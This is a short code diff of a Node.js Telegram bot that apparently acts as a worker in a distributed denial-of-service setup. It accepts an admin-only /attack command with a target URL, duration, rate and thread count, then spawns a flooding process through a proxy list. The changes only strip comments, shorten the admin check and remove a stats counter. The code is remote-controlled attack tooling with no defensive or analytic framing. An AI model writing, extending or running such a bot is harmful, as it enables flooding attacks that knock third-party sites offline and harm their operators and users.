@@ -15,20 +15,15 @@ if (!token) {
 
 const bot = new Telegraf(token);
 
-// Health check endpoint for Railway
 bot.telegram.getMe().then((info) => {
     console.log(`✅ Worker ${info.username} online`);
 });
 
-// Only accept commands from master (via chat ID verification)
 bot.use(async (ctx, next) => {
-    if (ctx.from.id.toString() !== ADMIN_ID) {
-        return;
-    }
+    if (ctx.from.id.toString() !== ADMIN_ID) return;
     return next();
 });
 
-// Attack command (only for this worker)
 bot.command('attack', async (ctx) => {
     const args = ctx.message.text.split(' ').slice(1);
     const [url, time, rate, threads, attackId] = args;
@@ -51,8 +46,6 @@ bot.command('attack', async (ctx) => {
         threads,
         'proxy.txt'
     ]);
-
-    let stats = { requests: 0, success: 0, fail: 0 };
 
     attack.stdout.on('data', (data) => {
         const output = data.toString();
